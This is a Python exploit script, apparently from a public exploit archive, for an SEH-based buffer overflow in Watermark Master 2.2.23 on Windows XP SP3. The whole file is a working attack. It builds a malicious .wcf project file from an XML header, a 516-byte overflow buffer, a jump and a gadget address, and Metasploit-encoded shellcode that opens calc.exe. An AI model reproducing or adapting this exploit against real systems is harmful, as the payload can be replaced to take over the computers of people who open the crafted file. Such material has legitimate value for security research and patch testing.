#!/usr/bin/python
# Exploit Title:Watermark Master Buffer Overflow (SEH)
# Date found: 31.10.2013
# Exploit Author: metacom
# URL:http://www.videocharge.com/download.php 
# Software Link:www.videocharge.com/download/WatermarkMaster_Install.exe
# Version: 2.2.23
# Vulnerable products:Watermark Master and Watermark Master + SDK
# Tested on: Windows XP SP3 
# Poc video demo : http://bit.ly/19enbvN
from struct import pack
head=("\x3C\x3F\x78\x6D\x6C\x20\x76\x65\x72\x73\x69\x6F\x6E\x3D\x22\x31\x2E\x30"
"\x22\x20\x65\x6E\x63\x6F\x64\x69\x6E\x67\x3D\x22\x57\x69\x6E\x64\x6F\x77\x73\x2D"
"\x31\x32\x35\x32\x22\x20\x3F\x3E\x3C\x63\x6F\x6E\x66\x69\x67\x20\x76\x65\x72\x3D"
"\x22\x32\x2E\x32\x2E\x32\x33\x2E\x30\x30\x22\x3E\x0A\x0A\x3C\x63\x6F\x6C\x73\x20"
"\x6E\x61\x6D\x65\x3D\x22\x46\x69\x6C\x65\x73\x22\x2F\x3E\x0A\x0A\x3C\x63\x6F\x6C"
"\x73\x20\x6E\x61\x6D\x65\x3D\x22\x50\x72\x6F\x66\x69\x6C\x65\x73\x22\x3E\x0A\x0A"
"\x3C\x50\x72\x6F\x70\x65\x72\x74\x79\x20\x6E\x61\x6D\x65\x3D\x22\x50\x72\x6F\x66"
"\x69\x6C\x65\x22\x3E\x0A\x0A\x3C\x63\x6F\x6C\x73\x20\x6E\x61\x6D\x65\x3D\x22\x57"
"\x61\x74\x65\x72\x6D\x61\x72\x6B\x73\x22\x2F\x3E\x0A\x0A\x3C\x63\x6F\x6C\x73\x20"
"\x6E\x61\x6D\x65\x3D\x22\x54\x69\x6D\x65\x6C\x69\x6E\x65\x73\x22\x2F\x3E\x0A\x0A"
"\x3C\x63\x6F\x6C\x73\x20\x6E\x61\x6D\x65\x3D\x22\x53\x74\x72\x65\x61\x6D\x73\x22"
"\x3E\x0A\x0A\x3C\x50\x72\x6F\x70\x65\x72\x74\x79\x20\x6E\x61\x6D\x65\x3D\x22\x53"
"\x74\x72\x65\x61\x6D\x22\x3E\x0A\x0A\x3C\x56\x61\x6C\x75\x65\x20\x6E\x61\x6D\x65"
"\x3D\x22\x53\x6F\x75\x72\x63\x65\x50\x61\x74\x68\x22\x20\x74\x79\x70\x65\x3D\x22"
"\x38\x22\x20\x76\x61\x6C\x75\x65\x3D\x22")

#msfpayload windows/exec CMD=calc.exe R | msfencode -e x86/shikata_ga_nai
#-b '\x00\x0a\x0d\x3c\x22\x26' -t c
shellcode = ("\xbb\x80\xa3\x02\xb2\xda\xcc\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x33\x31\x5e\x12\x03\x5e\x12\x83\x6e\x5f\xe0\x47\x92\x48\x6c"
"\xa7\x6a\x89\x0f\x21\x8f\xb8\x1d\x55\xc4\xe9\x91\x1d\x88\x01"
"\x59\x73\x38\x91\x2f\x5c\x4f\x12\x85\xba\x7e\xa3\x2b\x03\x2c"
"\x67\x2d\xff\x2e\xb4\x8d\x3e\xe1\xc9\xcc\x07\x1f\x21\x9c\xd0"
"\x54\x90\x31\x54\x28\x29\x33\xba\x27\x11\x4b\xbf\xf7\xe6\xe1"
"\xbe\x27\x56\x7d\x88\xdf\xdc\xd9\x29\xde\x31\x3a\x15\xa9\x3e"
"\x89\xed\x28\x97\xc3\x0e\x1b\xd7\x88\x30\x94\xda\xd1\x75\x12"
"\x05\xa4\x8d\x61\xb8\xbf\x55\x18\x66\x35\x48\xba\xed\xed\xa8"
"\x3b\x21\x6b\x3a\x37\x8e\xff\x64\x5b\x11\xd3\x1e\x67\x9a\xd2"
"\xf0\xee\xd8\xf0\xd4\xab\xbb\x99\x4d\x11\x6d\xa5\x8e\xfd\xd2"
"\x03\xc4\xef\x07\x35\x87\x65\xd9\xb7\xbd\xc0\xd9\xc7\xbd\x62"
"\xb2\xf6\x36\xed\xc5\x06\x9d\x4a\x39\x4d\xbc\xfa\xd2\x08\x54"
"\xbf\xbe\xaa\x82\x83\xc6\x28\x27\x7b\x3d\x30\x42\x7e\x79\xf6"
"\xbe\xf2\x12\x93\xc0\xa1\x13\xb6\xa2\x24\x80\x5a\x0b\xc3\x20"
"\xf8\x53")
buffer="\x41" * 516
buffer+="\xeb\x06\x90\x90"#
buffer+=pack('<I',0x02700fee)#0x02700fee : popad # jmp ebp
buffer+="\x90" * 100
shellcode+="\xCC" * (10000 - len(buffer))
end=("\x22\x2F\x3E\x0A\x0A\x3C\x2F\x50\x72\x6F\x70\x65\x72\x74\x79\x3E\x0A\x0A\x3C\x2F"
"\x63\x6F\x6C\x73\x3E\x0A\x0A\x3C\x63\x6F\x6C\x73\x20\x6E\x61\x6D\x65\x3D\x22\x52\x6F"
"\x6D\x61\x6E\x69\x61\x20\x53\x65\x63\x75\x72\x69\x74\x79\x20\x54\x65\x61\x6D\x22\x2F"
"\x3E\x0A\x0A\x3C\x2F\x50\x72\x6F\x70\x65\x72\x74\x79\x3E\x0A\x0A\x3C\x2F\x63\x6F\x6C"
"\x73\x3E\x0A\x0A\x3C\x2F\x63\x6F\x6E\x66\x69\x67\x3E")

off= head + buffer + shellcode + end

try:
	out_file = open("crash.wcf",'w')
	out_file.write(off)
	out_file.close()
	print("[*] Malicious wcf file created successfully")
except:
	print "[!] Error creating file"